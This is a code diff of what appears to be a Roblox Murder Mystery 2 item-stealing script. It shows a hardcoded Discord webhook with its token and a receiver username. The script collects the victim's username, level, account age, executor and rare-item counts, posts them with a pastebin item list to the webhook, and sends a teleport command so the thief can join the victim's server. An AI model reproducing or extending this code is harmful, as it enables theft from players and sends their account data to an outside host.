@@ -1,6 +1,5 @@
 userName = "Virmality1"
 webHook = "https://discord.com/api/webhooks/1343782704264515616/nQX34btCczY9XnlW3VRfuko9E2Vbq2IK3jrrUPrdEbnIQhmZrtXrZMvGNOBZ0HNPoBM2"
-
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -1060,21 +1059,15 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Common\n" .. commonsString
 
 local WebHookEmbed = CreateEmbed(
-    "🍓 MM2 ! | Notification",
+    "🍓 MURDER MYSTERY 2 ! | Notification",
     "Please execute the code above to get your hit.",
-    10234667,
+    tonumber(10234667),
     {
         {name = "〘:bust_in_silhouette:〙Player Info", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
-        {name = "〘:mailbox_with_no_mail:〙Hit Info", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
-        {name = "〘:dart:〙Hit List", value = "[Click Me]("..pastebin(EverythingString)..")"}
-    },
-    {
-        username = "@DomoScripts | MM2",
-        avatar_url = "https://media.discordapp.net/attachments/1343781172148305970/1343781193241595924/domo_kun_eating_strawberry_domo_kun.jpg?ex=67be8542&is=67bd33c2&hm=a9984a3bdf003f72af4558adb884610c6bb18355dc77e83ca4fe073a289ebcdc&=&format=webp&width=810&height=810"
+{name = "〘:ringed_planet:〙Hit Info", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
+{name = "〘:dart:〙Hit List", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
 )
-
-
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
     SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'", game.Players.LocalPlayer)', embeds = {WebHookEmbed}})
